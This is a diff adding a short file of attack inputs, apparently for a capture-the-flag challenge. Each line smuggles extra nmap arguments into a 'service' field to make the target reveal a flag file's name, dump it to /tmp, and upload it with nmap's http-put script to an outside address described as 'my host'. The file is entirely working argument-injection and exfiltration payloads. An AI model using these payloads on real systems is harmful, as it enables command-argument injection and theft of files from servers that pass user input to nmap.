@@ -1,0 +1,9 @@
+# leak flag name
+service=96.22.137.37%3A8080	-Pn	--script	/flag-????????????????????????????????.txt	-oN	/tmp/dump	
+
+# read leak
+service=96.22.137.37%3A8080	-Pn	--script	http-put	--script-args	http-put.url=/,http-put.file=/tmp/dump	
+
+# to send flag file to my host
+service=96.22.137.37%3A8080	-Pn	--script	http-put	--script-args	http-put.url=/,http-put.file=/flag-ef855e90cf7655abb5d351e3b8d81ae3.txt	
+
